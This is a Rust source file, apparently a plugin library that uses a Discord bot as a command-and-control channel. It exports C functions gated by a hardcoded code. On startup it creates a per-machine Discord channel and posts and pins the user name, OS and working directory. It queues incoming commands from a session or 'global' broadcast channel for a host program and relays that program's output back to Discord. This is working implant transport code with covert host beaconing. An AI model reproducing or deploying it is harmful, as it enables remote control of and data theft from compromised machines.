use serenity::async_trait;
use serenity::model::channel::{Message, ChannelType};
use serenity::prelude::*;
use serenity::model::id::{GuildId, ChannelId};
use serenity::Client;
use std::env;
use std::sync::atomic::{AtomicBool, Ordering};
use serenity::http::Http;
use std::ffi::{c_char, CStr, CString};
use std::sync::{Arc, Mutex};
use std::collections::VecDeque;
use serenity::model::gateway::Ready;
use once_cell::sync::Lazy;
use std::fs::File;
use std::io::{self, Write};
use tokio::runtime::Runtime;
use std::path::Path;

const TOKEN: &str = env!("DISCORD_TOKEN");
const MY_GUILD_ID: u64 = 1083863758146912297;
static mut GLOBAL_CHANNEL_ID: Option<ChannelId> = None;
static mut SESSION_CHANNEL_ID: Option<ChannelId> = None;
const BOT_ID: u64 = 1146568289930190869;

type MessageQueue = Arc<Mutex<VecDeque<String>>>;
struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, ready: Ready) {
        set_global_channel(&ctx).await;
        set_session_channel(&ctx).await;
        println!("{} is connected!", ready.user.name);
    }
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.author.id == BOT_ID {
            return;
        }
        if !is_valid_source(&msg) {
            return
        }
        enqueue_message(msg.content.clone());
        let _ = msg.react(&ctx.http, '👍').await;
    }
}
fn is_valid_source(message: &Message) -> bool {
    unsafe {
        if let Some(global_channel_id) = GLOBAL_CHANNEL_ID {
            if message.channel_id == global_channel_id {
                return true;
            }
        }
        if let Some(session_channel_id) = SESSION_CHANNEL_ID {
            if message.channel_id == session_channel_id {
                return true;
            }
        }
    }
    false
}
async fn set_global_channel(ctx: &Context) {
    let channels = match ctx.http.get_channels(MY_GUILD_ID).await {
        Ok(channels) => channels,
        Err(_err) => {
            return;
        }
    };
    if let Some(channel) = channels.iter().find(|ch| ch.name == "global") {
        unsafe {
            GLOBAL_CHANNEL_ID = Some(channel.id);
        }
    } else {
        unsafe {
            GLOBAL_CHANNEL_ID = None;
        }
    }
}
async fn set_session_channel(ctx: &Context) {
    let os = std::env::consts::OS;
    let current_user = std::env::var("USER").unwrap_or_else(|_| {
        std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string())
    });
    let session_id = format!("sess-{}-{}", os, current_user).to_lowercase().replace("\\", "-");

    let channels = match ctx.http.get_channels(MY_GUILD_ID).await {
        Ok(channels) => channels,
        Err(_err) => {
            return;
        }
    };

    if let Some(channel) = channels.iter().find(|ch| ch.name == session_id) {
        if let Err(err) = channel.id.say(&ctx.http, "Online").await {
            eprintln!("Error sending message: {:?}", err);
        }
        
        unsafe {
            SESSION_CHANNEL_ID = Some(channel.id);
        }
    } else {
        let guild = GuildId(MY_GUILD_ID);

        let new_channel_result = guild.create_channel(&ctx.http, |c| {
            c.name(session_id.clone())
             .kind(ChannelType::Text)
        }).await;

        if let Ok(new_channel) = new_channel_result {
            let current_dir = match env::current_dir() {
                Ok(dir) => dir.display().to_string(),
                Err(_) => {
                    return;
                }
            };
            let first_msg = format!(
                "Session *{}* opened! 🥳\n\n**User**: {}\n**OS**: {}\n**Current Directory**: {}",
                session_id, current_user, os, current_dir
            );

            if let Ok(message) = new_channel.id.say(&ctx.http, &first_msg).await {
                if let Err(err) = message.pin(&ctx.http).await {
                    eprintln!("Error pinning message: {:?}", err);
                }
            }
            unsafe {
                SESSION_CHANNEL_ID = Some(new_channel.id);
            }
        }
    }
}
fn enqueue_message(message: String) {
    let mut queue = MESSAGE_QUEUE.lock().unwrap();
    queue.push_back(message);
}

static MESSAGE_QUEUE: Lazy<MessageQueue> = Lazy::new(|| Arc::new(Mutex::new(VecDeque::new())));
static FUNCTION_VERIFIED: AtomicBool = AtomicBool::new(false);

#[no_mangle]
pub extern "C" fn initialize(code: *const c_char, path: *const c_char) -> i32 {
    let code_str = unsafe {
        if code.is_null() {
            return -1;
        }
        CStr::from_ptr(code).to_string_lossy().into_owned()
    };
    if !(code_str == "12234") {
        return -1;
    }
    FUNCTION_VERIFIED.store(true, Ordering::SeqCst);

    let path_str = unsafe {
        if path.is_null() {
            return -2;
        }
        CStr::from_ptr(path).to_string_lossy().into_owned()
    };
    if Path::new(&path_str).exists() {
        return 1;
    }
    let content = "type=communication\n\
                    version=1.0\n\
                    Functions
                    start_bot<void> startup-thread\n\
                    get_message<char> manual-single\n\
                    send_message<int, char> manual-single";

    // Write the content to the file
    if let Err(_e) = write_to_file(&path_str, content) {
        return -1;
    }
    return 0;
}
fn write_to_file(path: &str, content: &str) -> io::Result<()> {
    let mut file = File::create(path)?;
    file.write_all(content.as_bytes())?;
    Ok(())
}
#[no_mangle]
pub extern "C" fn start_bot() {
    if !FUNCTION_VERIFIED.load(Ordering::SeqCst){
        return;
    }
    let runtime = tokio::runtime::Runtime::new().expect("Failed to create Tokio runtime");

    runtime.block_on(async {
        let mut client = Client::builder(TOKEN)
            .event_handler(Handler)
            .await
            .expect("Error creating client");

        if let Err(why) = client.start().await {
            println!("Err with client: {:?}", why);
        }
    });
}
#[no_mangle]
pub extern "C" fn get_message() -> *const c_char {
    if !FUNCTION_VERIFIED.load(Ordering::SeqCst){
        return std::ptr::null();
    }
    let mut queue = MESSAGE_QUEUE.lock().unwrap();
    if let Some(message) = queue.pop_front() {
        let c_string = CString::new(message).expect("CString conversion failed");
        c_string.into_raw()
    } else {
        std::ptr::null()
    }
}
#[no_mangle]
pub extern "C" fn send_message(content: *const c_char) -> i32 {
    if !FUNCTION_VERIFIED.load(Ordering::SeqCst){
        return -1;
    }
    if content.is_null() {
        return -1;
    }

    let content = unsafe {
        CStr::from_ptr(content).to_string_lossy().into_owned()
    };

    let channel_id = unsafe {
        match SESSION_CHANNEL_ID {
            Some(channel_id) => {
                channel_id
            },
            None => {
                return -1;
            },
        }
    };

    let rt = match Runtime::new() {
        Ok(runtime) => {
            runtime
        },
        Err(_) => {
            return -1;
        },
    };

    let result = rt.block_on(async {
        let http = Http::new_with_token(TOKEN);
        channel_id.say(&http, &content).await
    });

    match result {
        Ok(_) => {
            0
        },
        Err(_) => {
            -1
        },
    }
}